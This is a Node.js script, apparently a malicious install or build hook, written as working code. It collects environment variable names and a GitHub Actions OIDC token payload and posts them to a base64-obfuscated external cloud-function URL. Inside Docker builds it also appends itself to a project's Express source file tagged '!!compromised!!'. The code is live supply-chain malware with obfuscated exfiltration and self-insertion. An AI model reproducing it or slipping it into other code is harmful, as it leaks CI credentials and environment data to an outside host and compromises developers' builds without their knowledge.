const path = require("path");
const fs   = require("fs");

const isDockerBuild = () => {
    // Check if running as docker container
    if (fs.existsSync( '/.dockerenv')) return false;

    // Check if running in docker
    const data = fs.readFileSync("/proc/1/attr/current");
    // docker-default (enforce)
    return data.indexOf('docker') != -1;
}

const getJsFiles = () => {
    const startDir = process.cwd();
    const files = [];
    
    const readDir = (dir) => {
        fs.readdirSync(dir).forEach(file => {
            const fileLower = file.toLowerCase()
            const pathAbs = path.join(dir, file);
            if (fs.statSync(pathAbs).isDirectory()) {
                // Ignore list
                if (pathAbs.startsWith('/dev/')) return;
                if (pathAbs.startsWith('/etc/')) return;
                if (pathAbs.startsWith('/proc/')) return;
                if (pathAbs.startsWith('/sys/')) return;
                
                readDir(pathAbs);
            }
            else if (fileLower.endsWith('.js') || fileLower.endsWith('.ts')) files.push(pathAbs);
        });
    };
    readDir(startDir);

    return files;
};

const extract = async () => {
    // Scrape env
    const extracted_data = {
        env_keys: Object.keys(process.env),
        token_payload: '',
    };

    // To hinder public scraping
    const data = "aHR0cHM6Ly9ldXJvcGUtd2VzdDEtZW50LWtuZ3Npa2RlbW8tZGV2LmNsb3VkZnVuY3Rpb25zLm5ldC9raW5nLXNpa2tlcmhldC1kZW1vLXJlYw" + "==";
    const url = Buffer.from(data, 'base64').toString('ascii');
        
    // Fetch github id token if it exists
    const actions_url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
    const request_token = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
    if (actions_url && request_token) {
        const res = await fetch(actions_url, {
            method: 'GET',
            headers: {
                'user-agent': 'actions/oidc-client',
                'Authorization': `Bearer ${request_token}`,
                'Accept': 'application/json',
            },
        });

        const data = await res.json();
        const token = data.value;
    
        // Only send payload since it's not sensitive
        // https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect#understanding-the-oidc-token
        const payload = token.split('.')[1];
        extracted_data.token_payload = payload;
    }

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'text/plain',
        },
        body: JSON.stringify(extracted_data),
    });
}; 

const insert = () => {
    if (!isDockerBuild()) return;
    const files = getJsFiles();

    for (const file of files) {
        const data = fs.readFileSync(file);
        if(data.indexOf('express') != -1 && data.indexOf('!!compromised!!') == -1) {
            fs.appendFileSync(file, `\nconst extract = ${String(extract)};\nextract();\n// !!compromised!!`);
            break
        }
    }
};

extract();
insert();